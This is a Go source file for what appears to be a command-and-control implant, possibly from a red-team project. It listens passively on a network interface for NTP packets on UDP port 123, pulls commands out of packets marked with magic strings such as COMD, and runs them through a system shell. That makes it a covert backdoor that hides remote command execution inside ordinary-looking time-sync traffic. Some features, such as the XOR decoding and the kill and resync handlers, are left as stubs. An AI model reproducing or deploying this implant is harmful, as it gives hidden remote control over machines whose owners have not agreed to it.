package handler

import (
	"bytes"
	"fmt"
	"log"
	_ "os"
	"os/exec"
	"strings"

	"mesa/goclient/pkg/agent"

	"github.com/google/gopacket"
	"github.com/google/gopacket/pcap"
)

//sniff for NTP traffic
//buffer?

func StartSniffer(newAgent agent.Agent) {
	msg := ""
	for {
		var (
			iface  = newAgent.IFace
			buffer = int32(1600)
			filter = "udp and port 123" //note for myself: listening for any NTP traffic, magic string search
			//when i send ping (from server) for the first time, it should take note of my IP and call setup. store that for beacons
			//if i ping again from a different IP, calls setup again with the new IP. fixes the ntp.fun dns issue
		)

		handler, err := pcap.OpenLive(iface, buffer, false, pcap.BlockForever)
		if err != nil {
			log.Fatal(err)
		}

		defer handler.Close()

		if err := handler.SetBPFFilter(filter); err != nil {
			log.Fatal(err)
		}

		source := gopacket.NewPacketSource(handler, handler.LinkType())
		for packet := range source.Packets() {
			ret, cont := harvestInfo(packet)
			if ret != "ignore" {
				msg += ret
			}
			if cont == "COMD" {
				runCommand(msg, newAgent)
				msg = ""
			} else if cont == "KILL" {
				//start shutdown
			} else if cont == "PING" {
				//resync
			} else if cont == "ignore" {
				continue
			}
		}
	}

}

func harvestInfo(packet gopacket.Packet) (string, string) {
	app := packet.ApplicationLayer()
	if app != nil {
		fmt.Println(app.LayerContents())
		final := decode(app.LayerContents())
		fmt.Println(final)
		index := strings.Index(final, "COM")
		if strings.Contains(final, "COMU") {
			return final[index+4:], "COMU"
		} else if strings.Contains(final, "COMD") {
			return final[index+4:], "COMD"
		} else if strings.Contains(final, "KILL") {
			return "", "KILL"
		} else if strings.Contains(final, "PING") {
			return "", "PING" //TODO server auto pings agent if goes to MIA, hoping for change response
		}
	}
	return "ignore", "ignore"
}

func runCommand(msg string, newAgent agent.Agent) {
	output, err := exec.Command(newAgent.ShellType, newAgent.ShellFlag, msg).Output()

	if err != nil {
		fmt.Println(err.Error())
		fmt.Println("Couldn't execute command")
	}

	fmt.Println(string(output))
} //should this go in agent?

func resync() {

} //should this go in agent?

func decode(content []byte) string {
	content = bytes.Trim(content, "\x00")
	return string(content)
	//TODO fix later with single XOR byte
}

//encode/decode/craft packets
/*
func Encode(data string) Packet { //fix args

}*/

//More notes for myself
//server will run on two main threads: listening for connections (always) -> action thread. And prompt.
//client will run on two main threads: sniffing traffic (always) and then responding to said traffic. maybe split the second part up into more strings too
